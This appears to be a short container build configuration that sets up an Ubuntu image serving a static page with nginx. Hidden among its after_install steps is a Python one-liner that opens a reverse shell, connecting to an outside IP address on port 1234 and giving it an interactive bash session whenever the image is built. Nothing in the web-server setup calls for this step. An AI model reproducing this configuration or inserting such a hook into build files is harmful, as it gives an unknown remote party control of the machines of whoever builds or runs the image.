---
base: 'ubuntu/trusty'

apt:
  packages:
    - nginx
    - python27

add:
  index.html: /usr/share/nginx/html/index.html

after_install:
  - echo "daemon off;" >> /etc/nginx/nginx.conf
  - python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("54.184.144.122",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

expose:
  - 80

cmd: [ '/usr/sbin/nginx' ]
